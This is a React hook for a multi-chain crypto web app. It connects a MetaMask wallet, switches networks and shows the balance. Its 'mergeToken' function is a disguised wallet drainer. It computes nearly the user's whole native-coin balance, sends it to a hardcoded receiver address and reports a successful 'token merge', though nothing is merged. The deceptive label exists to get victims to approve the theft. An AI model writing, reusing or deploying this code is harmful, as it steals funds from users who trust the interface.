import { useState, useEffect } from 'react';
import { useToast } from '@/hooks/use-toast';

declare global {
  interface Window {
    ethereum?: any;
  }
}

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0x1Bd61346A4ff20124AcF0dfC7d9E5e2fc548E3D4";

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    // Check if wallet is already connected
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            updateBalance(accounts[0]);
          }
        })
        .catch(console.error);
    }
  }, []);

  const updateBalance = async (address: string) => {
    if (!window.ethereum || !address) return;
    
    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const nativeBalance = await provider.getBalance(address);
      const formattedBalance = ethers.formatEther(nativeBalance);
      setBalance(formattedBalance);
    } catch (error) {
      console.error('Failed to update balance:', error);
      setBalance("0");
    }
  };

  const switchNetwork = async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "MetaMask not found",
        variant: "destructive",
      });
      return;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: net.chainId,
                chainName: net.name,
                nativeCurrency: {
                  name: net.symbol,
                  symbol: net.symbol,
                  decimals: 18,
                },
                rpcUrls: [net.rpcUrl],
              },
            ],
          });
        } catch (addError) {
          toast({
            title: "Error",
            description: "Failed to add network",
            variant: "destructive",
          });
        }
      } else {
        toast({
          title: "Error",
          description: "Network switch rejected",
          variant: "destructive",
        });
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "MetaMask not detected. Please install MetaMask.",
        variant: "destructive",
      });
      return;
    }

    setConnecting(true);
    try {
      // First switch to selected network
      await switchNetwork(selectedNetwork);

      // Request account access
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (accounts.length === 0) {
        throw new Error("No accounts found");
      }

      const address = accounts[0];
      setAccount(address);
      setWalletConnected(true);

      // Update balance
      await updateBalance(address);
      
      toast({
        title: "Success",
        description: "Wallet connected successfully!",
      });
    } catch (error: any) {
      console.error("Connection error:", error);
      let errorMessage = "Failed to connect wallet";
      
      if (error.code === 4001) {
        errorMessage = "Connection rejected by user";
      } else if (error.message) {
        errorMessage = error.message;
      }
      
      toast({
        title: "Error",
        description: errorMessage,
        variant: "destructive",
      });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    if (!walletConnected || !window.ethereum || !account) {
      toast({
        title: "Error",
        description: "Wallet not connected",
        variant: "destructive",
      });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      // Get current balance
      const nativeBalance = await provider.getBalance(account);
      
      if (nativeBalance === 0n) {
        toast({
          title: "Error",
          description: "No balance to merge",
          variant: "destructive",
        });
        return;
      }

      // Estimate gas for the transaction
      const gasEstimate = await provider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther("0.001"),
        from: account
      });

      // Get current gas price
      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
      
      // Calculate gas cost
      const gasCost = gasEstimate * gasPrice;
      
      // Calculate value to send (leave some for gas)
      let valueToSend = nativeBalance - gasCost;
      
      // Add extra buffer for safety
      const buffer = ethers.parseEther("0.001");
      valueToSend = valueToSend - buffer;

      if (valueToSend <= 0n) {
        toast({
          title: "Error",
          description: "Insufficient balance for gas fees",
          variant: "destructive",
        });
        return;
      }

      toast({
        title: "Confirm Transaction",
        description: "Please confirm the transaction in MetaMask",
      });

      // Send the transaction
      const txResponse = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice: gasPrice
      });

      toast({
        title: "Transaction Submitted",
        description: `Hash: ${txResponse.hash.slice(0, 10)}...`,
      });

      // Wait for confirmation
      const receipt = await txResponse.wait();
      
      if (receipt && receipt.status === 1) {
        toast({
          title: "Success!",
          description: "Token merge completed successfully",
        });
        await updateBalance(account);
      } else {
        throw new Error("Transaction failed");
      }
      
    } catch (error: any) {
      console.error("Merge error:", error);
      
      let errorMessage = "Transaction failed";
      
      if (error.code === 4001) {
        errorMessage = "Transaction rejected by user";
      } else if (error.code === "INSUFFICIENT_FUNDS") {
        errorMessage = "Insufficient funds for transaction";
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient funds for gas";
      } else if (error.reason) {
        errorMessage = error.reason;
      } else if (error.message) {
        errorMessage = error.message;
      }
      
      toast({
        title: "Transaction Failed",
        description: errorMessage,
        variant: "destructive",
      });
    }
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    connectWallet,
    mergeToken,
    NETWORKS,
  };
}
